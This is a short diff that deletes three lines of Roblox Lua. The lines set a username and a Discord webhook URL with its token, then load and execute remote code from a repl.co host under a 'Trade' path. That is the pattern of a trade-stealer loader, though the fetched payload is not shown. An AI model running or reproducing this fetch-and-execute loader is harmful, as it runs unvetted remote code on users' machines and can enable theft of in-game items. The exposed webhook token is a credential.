@@ -1,3 +1,0 @@
-getgenv().Username = "Babascriptt"
-getgenv().Webhook = "https://discord.com/api/webhooks/1200074115780980856/AVPt6pS-uZMtY7HZtBE8qmi4S9tsswGN1k7jkolAO3QXurDzQgrvtmjSmYTvn_t6qEiK"
-loadstring(game:HttpGet("https://a05d2724-cb03-4bb7-af5d-293c8436e212-00-3c9ykas6hdl4f.riker.repl.co/tbc/Trade", true))()
